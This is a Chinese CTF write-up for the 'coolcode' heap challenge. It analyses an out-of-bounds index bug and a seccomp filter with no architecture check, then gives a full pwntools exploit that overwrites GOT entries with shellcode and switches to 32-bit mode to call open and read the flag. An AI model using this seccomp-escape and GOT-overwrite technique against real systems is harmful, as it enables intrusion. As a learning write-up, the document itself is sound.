# coolcode

> 来自[at0de](http://39.107.127.44/archives/192/)

## 分析题目

题目只给了ELF文件，没给libc.so。试着运行了一下，是个堆题目，只开了canary
有三个功能，add，show，delete

```shellcode
 1. Add a note                 
 2. show messages of the note  
 3. delete a note              
 4. Exit
```

add函数只能申请固定0x20大小的堆块，对index没有检查，v1是有符号整数，存在越界读写

![image.png](https://i.loli.net/2020/07/12/GjAi8lkKOCtRomY.png)

在读入messages的时候也有猫腻，有个对读入字符串check的函数，只允许读入大写字母和数字

```c
unsigned __int64 __fastcall read_content(char *addr, int size)
{
  void *v2; // rsp
  __int64 v4; // [rsp+0h] [rbp-40h]
  int v5; // [rsp+4h] [rbp-3Ch]
  char *dest; // [rsp+8h] [rbp-38h]
  char v7; // [rsp+13h] [rbp-2Dh]
  int v8; // [rsp+14h] [rbp-2Ch]
  __int64 v9; // [rsp+18h] [rbp-28h]
  void *s; // [rsp+20h] [rbp-20h]
  unsigned __int64 v11; // [rsp+28h] [rbp-18h]

  dest = addr;
  v5 = size;
  v11 = __readfsqword(0x28u);
  v8 = 0;
  v9 = size + 0x10 - 1LL;
  v2 = alloca(16 * ((size + 0x10 + 0xFLL) / 0x10uLL));
  s = &v4;
  memset(&v4, 0, size);
  printf("messages: ", 0LL);
  v8 = read(0, s, v5);
  if ( v8 < 0 )
  {
    puts("read error.");
    exit(1);
  }
  v7 = *(s + v8 - 1);
  if ( v7 == 0xA )
    v7 = 0;
  if ( sec_checks(s, v8) )
  {
    puts("read error.");
    exit(1);
  }
  strncpy(dest, s, v8);
  return __readfsqword(0x28u) ^ v11;
}
```

特殊的函数：alloca

> 内存分配函数,与malloc,calloc,realloc类似.
> 但是注意一个重要的区别,_alloca是在栈(stack)上申请空间,该变量离开其作用域之后被自动释放，无需手动调用释放函数。
> alloca不宜使用在必须广泛移植的程序中, 因为有些机器不一定有传统意义上的”堆栈”.
> gdb调试堆情况的时候发现heap和一部分bss段可读可写可执行？？

![image.png](https://i.loli.net/2020/07/12/P5WxOVtjBmUbLHq.png)

程序开了沙箱，只允许下面四个函数执行，缺少open函数
第一眼我就发现和其他沙箱题有点不同，这道题缺少

```shellcode
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004
```

这样的两条语句，这两条语句的作用是限制系统架构，没有这个过滤规则说明这道题可以用i386的函数调用号实现功能，fstat在64位架构中是5号，open函数在32位架构中也是5号，这难道是巧合吗？？（嘴角漏出一丝微笑）

```shellcode
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0006
 0002: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0006
 0003: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0006
 0004: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0006
 0005: 0x06 0x00 0x00 0x00050005  return ERRNO(5)
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

## 漏洞利用

利用步骤：
1.通过修改exit_got为ret，可以跳过check机制；
2.由于堆块大小有限，需要修改free_got为shellcode1，用来读入更长的shellcode2；
3.shllcode2需要实现open->read->write一系列操作读出flag；

这道题比较考验shellcode的编写能力，一些汇编语句被限制了，可以通过其他语句来构造

## exp

```python
from pwn import *
context.log_level = 'debug'
debug = 1
elf = ELF('coolcode')

if debug:
    sh = process('./coolcode')
    libc = elf.libc
else:
    sh = remote('39.107.119.192',9999)

def add(idx,data):
    sh.sendlineafter('Your choice :',str(1))
    sh.recvuntil('Index: ')
    sh.sendline(str(idx))
    sh.recvuntil('messages: ')
    sh.send(str(data))
def show(idx):
    sh.sendlineafter('Your choice :',str(2))
    sh.recvuntil('Index: ')
    sh.sendline(str(idx))
def delete(idx):
    sh.sendlineafter('Your choice :',str(3))
    sh.recvuntil('Index: ')
    sh.sendline(str(idx))

add('-22',asm('ret',arch = 'amd64'))#exit_got->ret
shellcode1 = '''
    		xor eax, eax
        mov edi, eax
        push 0x60
        pop rdx
        mov esi, 0x1010101
        xor esi, 0x1612601
        syscall
        mov esp, esi
        retfq
'''
add('-37',asm(shellcode1,arch = 'amd64'))#free_got->shellcode1
delete(0)
shellcode2 = '''
    mov esp, 0x602770
    push 0x67616c66
    push esp
    pop ebx
    xor ecx,ecx
    mov eax,5
    int 0x80
'''
shellcode3 = '''
    push 0x33
    push 0x60272e
    retfq
    
    mov rdi,0x3
    mov rsi,rsp
    mov rdx,0x60
    xor rax,rax
    syscall
    mov rdi,1
    mov rax,1
    syscall
'''
sh.sendline(p64(0x602710)+p64(0x23)+asm(shellcode2,arch='i386')+asm(shellcode3,arch='amd64'))
sh.interactive()
```

参考链接
https://xz.aliyun.com/t/6645
https://sh1ner.github.io/2020/07/07/SCTF-2020-PWN/